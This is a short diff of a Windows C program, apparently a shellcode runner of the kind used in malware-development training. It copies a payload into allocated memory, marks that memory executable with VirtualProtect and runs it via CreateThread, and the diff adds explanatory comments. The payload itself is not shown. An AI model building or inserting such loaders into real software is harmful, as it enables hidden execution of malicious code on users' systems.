@@ -23,15 +23,19 @@ int main(void)
 	printf("Payload address: 0x%-16p\n", (void *)payload);
 	printf("Executable memory address: 0x%-16p\n", (void *)exec_mem);
 
+    // Move payload into newly allocated memory
 	RtlMoveMemory(exec_mem, payload, size);
+
+    // Change the permissions of the memory to make it executable
 	rv = VirtualProtect(exec_mem, size, PAGE_EXECUTE_READ, &old_protect);
 
 	system("pause");
 
+    // If successful, start a thread using the payload, then wait for it to exit.
 	if (rv)
 	{
 		th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
-		WaitForSingleObject(th, INFINITE);
+		WaitForSingleObject(th, INFINITE); // optional
 	}
 
 	return 0;
